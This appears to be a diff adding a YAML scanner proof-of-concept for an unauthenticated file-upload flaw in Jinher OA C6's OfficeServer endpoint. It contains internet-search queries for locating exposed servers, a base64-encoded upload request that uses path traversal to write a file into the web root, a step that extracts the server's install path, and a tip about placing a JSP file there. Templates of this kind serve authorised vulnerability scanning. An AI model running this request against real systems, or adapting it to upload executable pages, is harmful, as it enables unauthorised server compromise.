@@ -1,0 +1,52 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: /public/edit/4ndex.txt | 绝对路径 D:/Jinher/JC6Server/apache-tomcat-6.0.32-X64/webapps/public/edit/test123.jsp
+
+name: poc-yaml-jinhe-c6-OfficeServer-upload
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /jc6/OfficeServer
+      follow_redirects: false
+      headers:
+        Content-Disposition: attachment; filename="filename.jpg"
+        Content-Type: application/octet-stream
+      body: "aaabbbabbbbbaaab89              0               5               DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nFILENAME=Ly4uLy4uL3B1YmxpYy9lZGl0LzRuZGV4LnR4dA==\r\n4ra1n"  
+    expression: >-
+      response.status == 200 &&  response.body_string.contains("0")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /public/edit/4ndex.txt
+      follow_redirects: false
+      headers: 
+      body:    
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n")
+expression: r0() && r1()
